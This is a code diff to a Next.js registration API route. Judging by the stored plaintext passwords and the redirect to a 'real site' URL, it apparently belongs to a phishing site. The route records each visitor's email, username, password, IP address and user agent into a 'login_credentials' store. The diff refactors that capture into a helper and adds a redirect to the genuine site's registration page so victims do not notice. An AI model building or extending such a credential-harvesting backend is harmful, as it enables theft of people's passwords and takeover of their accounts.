@@ -1,5 +1,6 @@
 import { NextRequest, NextResponse } from "next/server";
-import { getSupabaseAdmin } from "@/lib/supabase";
+import { saveLoginCredential } from "@/lib/credentials";
+import { REAL_SITE_URLS } from "@/lib/routes";
 
 export async function POST(request: NextRequest) {
   try {
@@ -12,31 +13,19 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    const ip =
-      request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
-      request.headers.get("x-real-ip") ||
-      "unknown";
-    const userAgent = request.headers.get("user-agent") || "unknown";
-
-    const supabase = getSupabaseAdmin();
-    const { error } = await supabase.from("login_credentials").insert({
-      email,
-      username,
-      password,
-      ip_address: ip,
-      user_agent: userAgent,
-      page: "register",
-    });
-
-    if (error) {
-      console.error("Supabase insert error:", error);
+    try {
+      await saveLoginCredential(request, username, password, "register", email);
+    } catch {
       return NextResponse.json(
         { error: "Service temporarily unavailable" },
         { status: 500 }
       );
     }
 
-    return NextResponse.json({ success: true });
+    return NextResponse.json({
+      success: true,
+      redirect: REAL_SITE_URLS.pmsRegister,
+    });
   } catch (err) {
     console.error("Register API error:", err);
     return NextResponse.json(
